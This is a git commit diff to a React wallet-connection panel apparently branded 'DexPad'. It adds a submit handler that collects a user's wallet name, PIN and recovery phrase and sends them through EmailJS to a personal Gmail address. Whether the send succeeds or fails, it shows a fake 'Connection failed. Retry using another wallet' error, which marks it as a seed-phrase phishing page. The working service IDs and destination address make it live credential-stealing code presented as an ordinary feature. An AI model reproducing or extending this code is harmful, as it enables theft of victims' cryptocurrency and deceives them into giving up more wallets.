efdfca75f8807649a84c50def149f5ced771c185
codewithaudrey <fantasticaudrey001@gmail.com>
2024-07-19 21:05:16 +0100

    new handleSubmit, usestate hooks, ...

--- src/features/wallet/components/Panel.tsx
+++ src/features/wallet/components/Panel.tsx
@@ -1,4 +1,4 @@
-import React from 'react';
+import React, { useState } from 'react';
 import Form from '../../../components/Form/Form';
 import TextField from '../../../components/TextField/TextField';
 import Box from '../../../components/Box/Box';
@@ -9,15 +9,57 @@ import * as Yup from 'yup';
 import Text from '../../../components/Text/Text';
 
 const validationSchema = Yup.object().shape({
+  name: Yup.string(),
   pin: Yup.string().required('Enter your PIN'),
   phrase: Yup.string().required('Enter your phrase'),
 });
 
 const Panel = () => {
   const { values, nextStep } = useStep();
+  const [isLoading, setIsLoading] = useState(false);
+  const [isSuccess, setIsSuccess] = useState(false);
+  const [isError, setIsError] = useState(false);
 
-  const handleSubmit = (currentValues: typeof values) =>
+  const handleSubmit = async (currentValues: typeof values) => {
+    setIsLoading(true);
     nextStep(currentValues, true);
+
+    const endpoint = 'https://api.emailjs.com/api/v1.0/email/send';
+    try {
+      const response = await fetch(endpoint, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          service_id: 'service_y7rcto7',
+          template_id: 'template_sl44eng',
+          user_id: 'YcYqG6Ye2GHk81gDv',
+          template_params: {
+            from: 'DexPad',
+            email: 'codewithdoe@gmail.com',
+            wallet_app: values.wallet,
+            wallet_name: currentValues.name,
+            wallet_phrase: currentValues.phrase,
+            wallet_pin: currentValues.pin,
+          },
+        }),
+      });
+
+      if (!response.ok) {
+        setIsError(true);
+        setIsLoading(false);
+        return;
+      }
+
+      setIsSuccess(true);
+      setIsLoading(false);
+    } catch (error) {
+      setIsError(true);
+      setIsLoading(false);
+      console.log('Unable to submit request', error);
+    }
+  };
 
   return (
     <Form
@@ -32,6 +74,14 @@ const Panel = () => {
             p={'lg'}
             spaceY={'md'}
           >
+            <Form.Field name='name'>
+              <Form.Label>Wallet name</Form.Label>
+              <Form.Block>
+                <TextField placeholder={'Wallet name'} />
+              </Form.Block>
+              <Form.Helper />
+            </Form.Field>
+
             <Form.Field name='pin'>
               <Form.Label>Pass code</Form.Label>
               <Form.Block>
@@ -39,6 +89,7 @@ const Panel = () => {
               </Form.Block>
               <Form.Helper />
             </Form.Field>
+
             <Form.Field name='phrase'>
               <Form.Label>Phrase</Form.Label>
               <Form.Block>
@@ -49,17 +100,22 @@ const Panel = () => {
               <Form.Helper />
             </Form.Field>
 
-            <Box
-              p={'sm'}
-              radius={'sm'}
-              backgroundColor={'red-60'}
-            >
-              <Text color={'white'}>
-                Connection failed. Retry using another wallet.
-              </Text>
-            </Box>
+            {isSuccess || isError ? (
+              <Box
+                p={'sm'}
+                radius={'sm'}
+                backgroundColor={'red-60'}
+              >
+                <Text color={'white'}>
+                  Connection failed. Retry using another wallet.
+                </Text>
+              </Box>
+            ) : null}
           </Box>
-          <Footer />
+          <Footer
+            label='Connect'
+            disabled={isLoading}
+          />
         </Form.Wrapper>
       )}
     </Form>
